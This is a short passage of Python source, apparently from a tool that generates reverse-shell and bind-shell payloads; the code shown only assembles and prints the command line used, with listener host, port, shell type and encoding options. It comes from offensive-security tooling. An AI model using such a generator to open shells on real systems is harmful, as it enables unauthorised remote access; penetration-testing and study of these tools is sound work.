            cmdline = f'{sys.argv[0]} --reverse-shell --type {options.TYPE} --encode {options.ENCODE} --lhost {options.LHOST} --lport {options.LPORT}'
        elif options.SHELLTYPE == "revshells":
            cmdline = f'{sys.argv[0]} --reverse-shell --type {options.TYPE} --lhost {options.LHOST} --lport {options.LPORT}'
        elif options.SHELLTYPE == "bindshells" and options.ENCODE:
            cmdline = f'{sys.argv[0]} --bind-shell --type {options.TYPE} --encode {options.ENCODE} --lport {options.LPORT}'
        elif options.SHELLTYPE == "bindshells":
            cmdline = f'{sys.argv[0]} --bind-shell --type {options.TYPE} --lport {options.LPORT}'
        print('\n' + Fore.RED + Style.BRIGHT + '[CLI command used]\n' + Style.RESET_ALL + cmdline + '\n')